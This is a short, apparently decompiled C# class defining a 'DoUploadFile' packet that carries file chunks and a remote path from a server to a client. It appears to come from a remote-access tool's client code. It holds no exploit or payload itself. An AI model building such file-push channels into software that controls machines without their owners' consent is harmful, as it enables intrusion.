using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoUploadFile : GInterface4
{
	public int ID { get; set; }

	public string RemotePath { get; set; }

	public byte[] Block { get; set; }

	public int MaxBlocks { get; set; }

	public int CurrentBlock { get; set; }

	public DoUploadFile()
	{
	}

	public DoUploadFile(int id, string remotepath, byte[] block, int maxblocks, int currentblock)
	{
		ID = id;
		RemotePath = remotepath;
		Block = block;
		MaxBlocks = maxblocks;
		CurrentBlock = currentblock;
	}

	public void Execute(GClass33 client)
	{
		client.method_8(this);
	}
}
